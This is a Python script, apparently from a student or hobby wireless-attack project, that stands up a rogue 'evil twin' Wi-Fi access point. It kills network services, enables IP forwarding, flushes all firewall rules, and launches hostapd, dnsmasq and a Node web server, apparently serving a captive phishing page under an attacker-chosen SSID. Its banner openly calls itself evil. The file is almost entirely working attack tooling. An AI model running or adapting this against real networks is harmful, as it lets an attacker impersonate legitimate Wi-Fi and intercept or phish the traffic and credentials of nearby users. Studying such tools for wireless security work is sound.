import os
import sys

 
### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


### Reset all the setting before we satrt. 
def reset_setting():
	### Start system network service
	os.system('service NetworkManager start')
	### Stop apache2 service
	os.system('service apache2 stop')
	### Stop and kill the hostapd and dnsmasq services.
	os.system('service hostapd stop') #hostapd (host access point daemon) for make access point
	os.system('service dnsmasq stop') #dsnmasq is to make DNS and DHCP server
	os.system('service rpcbind stop') #https://linux.die.net/man/8/rpcbind#:~:text=The%20rpcbind%20utility%20is%20a,it%20is%20prepared%20to%20serve.
	os.system('killall dnsmasq >/dev/null 2>&1')
	os.system('killall hostapd >/dev/null 2>&1')
	### Enable and start all the process that uses port 53.
	# For 'systemctl' and 'systemd' see explaination in - https://wiki.archlinux.org/index.php/Systemd
	os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1') #https://wiki.archlinux.org/index.php/Systemd-resolved
	os.system('systemctl start systemd-resolved >/dev/null 2>&1') # responsible on Local DNS


##############################################
############### Start fake AP ################
##############################################
	
### Setup the fake access point settings.
def fake_ap_on():
	### Disable and stop all the process that uses port 53.
	os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
	os.system('systemctl stop systemd-resolved>/dev/null 2>&1')
	### Stop system network service 
	os.system('service NetworkManager stop')
	### Define the fake AP ip address, and the subnet mask.
	ifconfig="ifconfig "+ interface2 +" 10.0.0.1 netmask 255.255.255.0"
	# os.system('airmon-ng check kill')
	### Replace airmon-ng.
	os.system(' pkill -9 hostapd')
	os.system(' pkill -9 dnsmasq')
	os.system(' pkill -9 wpa_supplicant') #https://wiki.archlinux.org/index.php/Wpa_supplicant
	os.system(' pkill -9 avahi-daemon') #https://wiki.archlinux.org/index.php/Avahi
	os.system(' pkill -9 dhclient') # provide on DHCP https://linux.die.net/man/8/dhclient
	os.system('killall dnsmasq >/dev/null 2>&1')
	os.system('killall hostapd >/dev/null 2>&1')
	os.system(ifconfig)
	### Define the default gateway.
	os.system('route add default gw 10.0.0.1') #A default gateway is the node in a computer network using the internet protocol suite that serves as the forwarding host (router) to other networks when no other route specification matches the destination IP address of a packet.
	### Enable IP forwarding (1 indicates to enable / 0 indicates to disable)
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	### Flush all chains - delete all of the firewall rules.
	# Chain is the set of rules that filter the incoming and outgoing data packets.
	os.system('iptables --flush')
	os.system('iptables --table nat --flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	### Allowing packets to pass through. 
	os.system('iptables -P FORWARD ACCEPT')
 

### Link dnsmasq and hostapd to the configuration files. And Run the web server.
def run_fake_ap():
	### Link the dnsmasq to the configuration file.
	os.system('dnsmasq -C dnsmasq.conf')
	### Start apache2 - web server
	# os.system('service apache2 start')
	### Start the web server
	os.system('gnome-terminal -- sh -c "node html/index2.js"')
	# os.system('route add default gw 10.0.0.1')
	### Link the hostapd to the configuration file.
	os.system('hostapd hostapd.conf -B')
	# os.system('service apache2 start')
	os.system('route add default gw 10.0.0.1')


##############################################
############ Configuration files #############
##############################################

### Create the hostapd and dnsmasq configuration files.	
def create_conf_files():
	line="python3 create_conf_files.py "+ interface2 + " " + essid
	os.system(line)


### Delete the hostapd and dnsmasq configuration files (they were temp files).
def remove_conf_files():
	try:
	    os.remove("dnsmasq.conf")
	except OSError:
	    pass
	try:
	    os.remove("hostapd.conf")
	except OSError:
	    pass


######################

if __name__ == "__main__":
	print(B + "********************************************************************** \n")
	print("******** Part 2: Set up & upload fake AP. MOHAHA. WE ARE EVIL ******** \n")
	print("********************************************************************** \n")
	### Step 1: Choosing the interface to be used as the AP
	print(G + "*** Step 1:  Choosing an interface that will be used for the fake AP. ***\n")
	empty = input ("Press Enter to continue.........")
	print(W)
	os.system('ifconfig')
	global interface2
	interface2 = input(G + "Please enter the interface name you want to use: ")
	
	# Reset all the setting
	reset_setting() 
	
	# ssid=input("Please enter the SSID name ")
	global essid
	# The name of the fake AP (input)
	essid = sys.argv[1] 
	
	### Step 2: Activate the fake AP
	print(G + "*** Step 2:  Activation of the fake AP. ***\n")
	empty = input ("Press Enter to continue.........")
	print(W)
	fake_ap_on()
	create_conf_files()
	run_fake_ap()
	
	### Step 3: Deactivate the fake AP
	print(G + "*** Step 3:  Deactivation of the fake AP. ***\n")
	empty = input ("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
	remove_conf_files()
	reset_setting()
	
	print(G + "Everything returned back to default setting. \nHopes to see you soon :) ***\n")

	
	
